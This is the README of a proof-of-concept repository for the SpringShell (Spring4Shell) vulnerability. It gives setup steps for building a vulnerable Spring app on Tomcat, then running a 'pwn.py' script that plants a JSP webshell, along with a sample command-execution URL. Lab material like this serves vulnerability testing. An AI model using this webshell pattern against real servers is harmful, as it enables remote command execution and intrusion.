A POC for SpringShell exploit running on Ubuntu (tested on 20.04) 
Prerequisites:
- sudo apt install default-jre
- sudo apt install default-jdk
- sudo apt install maven
- Follow this guide to install tomcat (this will install tomcat 10 which can work with slight modification that will be described here. you can also install tomcat 9 which doesn't need this modification)
https://www.vultr.com/docs/install-apache-tomcat-on-ubuntu-20-04-39123/

App Preperation:
- Download the spring web app from the 'app' directory in this repo
- cd to it and run 'mvn package'
- after it's done, cd to 'target' directory which was created and copy the 'zex-poc.war' file

Deployment:
*tomcat-root-dir* - should be '/opt/tomcat/' if you followed the above guide.
- If you're running tomcat < 10 : copy the war file to '*tomcat-root-dir*/webapps/'  
- If you're running tomcat 10: 
    1. create a directory named 'webapps-javaee' in *tomcat-root-dir*
    2. copy the war file to this directory
    3. Tomcat will migrate the legacy J2EE war file automaticlly from that folder and will deploy it in *tomcat-root-dir*/webapps/' 
- Run tomcat with  *tomcat-root-dir*/bin/catalina.sh run' and check for errors.
- If everything worked, we can now run the poc.py file and access a browser to launch commands in the created webshell.
    1. Run python (or python3) pwn.py --url http://server.ip:8080/zex-poc/greeting
    2. Acess via browser or other http client with GET: http://server.ip:8080/zex-poc/tomcatwar.jsp?pwd=j&cmd=whoami
    3. PWND
